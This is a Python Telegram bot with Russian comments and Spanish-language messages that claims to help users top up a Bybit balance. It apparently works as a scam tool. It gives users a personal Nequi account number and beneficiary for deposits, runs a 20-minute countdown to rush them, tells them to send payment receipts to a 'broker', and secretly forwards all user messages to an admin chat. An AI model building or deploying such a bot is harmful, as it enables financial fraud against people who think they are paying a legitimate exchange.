import os
import asyncio
import random
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = os.environ.get("TOKEN")
ADMIN_CHAT_ID = -1003725431948

if not TOKEN:
    raise ValueError("Не установлен TOKEN")

# ---------- клавиатуры ----------
def make_keyboard(options):
    return ReplyKeyboardMarkup([options], resize_keyboard=True)

start_kb = make_keyboard(["Inicio"])
deposit_kb = ReplyKeyboardMarkup([["Ahora", "Más tarde"]], resize_keyboard=True)
get_data_kb = make_keyboard(["Obtener datos💳"])

# ---------- генерация ID ----------
def generate_user_id():
    return "".join(str(random.randint(0, 9)) for _ in range(7)) + "****"

# ---------- прогресс бар ----------
def build_bar(minutes_left):
    total = 20
    green = int((minutes_left / total) * 10)
    return "🟢" * green + "⚪" * (10 - green)

# ---------- формат времени ----------
def format_time(seconds):
    m = seconds // 60
    s = seconds % 60
    return f"{m:02d}:{s:02d}"

# ---------- текст реквизитов ----------
def build_payment_text(seconds_left):
    minutes_left = seconds_left // 60
    bar = build_bar(minutes_left)
    timer = format_time(seconds_left)
    return (
        "DATOS ACTUALES:\n\n"
        "NEQUI ✅\n"
        "Beneficiario: Jose Zalupa\n"
        "Número: 6382929393\n\n"
        "Después de realizar el pago, envíe una captura de pantalla del recibo al corredor con el que trabaja para confirmar el pago ❗\n\n"
        "ESTA INFORMACIÓN ES VÁLIDA DURANTE 20 MINUTOS DESDE EL MOMENTO DE SU RECEPCIÓN❗️\n\n"
        f"{bar}\n"
        f"Tiempo restante: {timer}"
    )

# ---------- таймер (новая надёжная версия) ----------
async def payment_timer_task(chat_id: int, message_id: int, context: ContextTypes.DEFAULT_TYPE):
    """Задача таймера. Обновляет сообщение каждую минуту и удаляет в конце."""
    seconds = 1200  # 20 минут

    try:
        while True:
            # Обновляем текст и бар
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=build_payment_text(seconds),
                    reply_markup=get_data_kb
                )
            except Exception:
                # Сообщение удалено или недоступно — завершаем задачу
                return

            # Если дошли до 00:00 — показываем 2 секунды и удаляем
            if seconds <= 0:
                await asyncio.sleep(2)
                try:
                    await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
                except:
                    pass
                return

            # Ждём минуту
            await asyncio.sleep(60)
            seconds -= 60

    except asyncio.CancelledError:
        # Задача отменена (пользователь запросил новые реквизиты) — ничего не делаем
        return
    except Exception:
        # На всякий случай
        return


# ---------- отправка реквизитов (главная функция) ----------
async def send_payment_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    # 1. Отменяем старую задачу таймера (если есть)
    if "payment_task" in context.user_data:
        task = context.user_data["payment_task"]
        if not task.done():
            task.cancel()
        context.user_data.pop("payment_task", None)

    # 2. Удаляем старое сообщение с реквизитами (обязательно!)
    old_msg_id = context.user_data.get("payment_msg_id")
    if old_msg_id:
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=old_msg_id)
        except:
            pass  # уже удалено или ошибка — не важно

    # 3. Анимация загрузки
    loading = await update.message.reply_text("Cargando: ░░░░░")
    for i in range(1, 6):
        bar = "█" * i + "░" * (5 - i)
        try:
            await loading.edit_text(f"Cargando: {bar}")
            await asyncio.sleep(0.5)
        except:
            pass
    try:
        await loading.delete()
    except:
        pass

    # 4. Отправляем новое сообщение с реквизитами
    payment_msg = await update.message.reply_text(
        build_payment_text(1200),
        reply_markup=get_data_kb
    )

    # 5. Сохраняем ID сообщения
    context.user_data["payment_msg_id"] = payment_msg.message_id

    # 6. Запускаем таймер
    task = asyncio.create_task(
        payment_timer_task(chat_id, payment_msg.message_id, context)
    )
    context.user_data["payment_task"] = task


# ---------- старт ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    # Полностью очищаем предыдущий платёж
    if "payment_task" in context.user_data:
        task = context.user_data["payment_task"]
        if not task.done():
            task.cancel()
        context.user_data.pop("payment_task", None)

    if "payment_msg_id" in context.user_data:
        try:
            await context.bot.delete_message(
                chat_id=chat_id,
                message_id=context.user_data["payment_msg_id"]
            )
        except:
            pass
        context.user_data.pop("payment_msg_id", None)

    context.user_data.clear()
    context.user_data["state"] = "START"

    photo_path = os.path.join("images", "card.jpg")
    text = (
        "Hola, este es un bot para recargar el saldo de la plataforma Bybit.\n"
        "Aquí puede obtener los datos necesarios para realizar la recarga\n\n"
        "Para comenzar, haga clic en el botón «Inicio»"
    )

    if os.path.exists(photo_path):
        with open(photo_path, "rb") as photo:
            await update.message.reply_photo(photo=photo, caption=text, reply_markup=start_kb)
    else:
        await update.message.reply_text(text, reply_markup=start_kb)


# ---------- пересылка админу ----------
async def forward_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.message
    user_info = f"👤 {user.first_name} | ID:{user.id}"
    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=user_info)

    if msg.text:
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg.text)
    elif msg.photo:
        await context.bot.send_photo(chat_id=ADMIN_CHAT_ID, photo=msg.photo[-1].file_id, caption=msg.caption)
    elif msg.document:
        await context.bot.send_document(chat_id=ADMIN_CHAT_ID, document=msg.document.file_id, caption=msg.caption)


# ---------- ответы из админ чата ----------
async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return
    if not update.message.reply_to_message:
        return

    reply = update.message.reply_to_message
    if not reply.text:
        return

    for line in reply.text.splitlines():
        if "ID:" in line:
            try:
                user_id = int(line.split("ID:")[1].strip())
                if update.message.text:
                    await context.bot.send_message(chat_id=user_id, text=update.message.text)
                return
            except:
                pass


# ---------- основной обработчик ----------
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    text = msg.text.strip() if msg.text else ""

    # Пересылаем всё админу (кроме админ-чата)
    if msg.chat.id != ADMIN_CHAT_ID:
        await forward_to_admin(update, context)

    state = context.user_data.get("state", "START")

    # Inicio
    if text == "Inicio":
        if "deposit_id" not in context.user_data:
            context.user_data["deposit_id"] = generate_user_id()
        deposit_id = context.user_data["deposit_id"]
        name = update.effective_user.first_name or "Usuario"
        message = (
            f"{name}\n\n"
            "Se le ha asignado un número único\n"
            f"ID {deposit_id}\n\n"
            "Desea realizar el depósito ahora o más tarde?"
        )
        await msg.reply_text(message, reply_markup=deposit_kb)
        context.user_data["state"] = "ASK_DEPOSIT"
        return

    # Ahora
    if state == "ASK_DEPOSIT" and text == "Ahora":
        await send_payment_info(update, context)
        context.user_data["state"] = "WAIT_DATA"
        return

    # Más tarde
    if state == "ASK_DEPOSIT" and text == "Más tarde":
        await msg.reply_text(
            "Los datos de la plataforma se actualizan constantemente para garantizar la seguridad de los clientes.\n\n"
            "Cuando esté listo para realizar un depósito, haga clic en el botón «Obtener datos💳»",
            reply_markup=get_data_kb
        )
        context.user_data["state"] = "WAIT_DATA"
        return

    # Obtener datos💳
    if text == "Obtener datos💳":
        await send_payment_info(update, context)
        context.user_data["state"] = "WAIT_DATA"
        return


# ---------- запуск ----------
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.ALL & ~filters.Chat(ADMIN_CHAT_ID), message_handler))
    app.add_handler(MessageHandler(filters.ALL & filters.Chat(ADMIN_CHAT_ID), admin_reply))

    print("Бот запущен...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()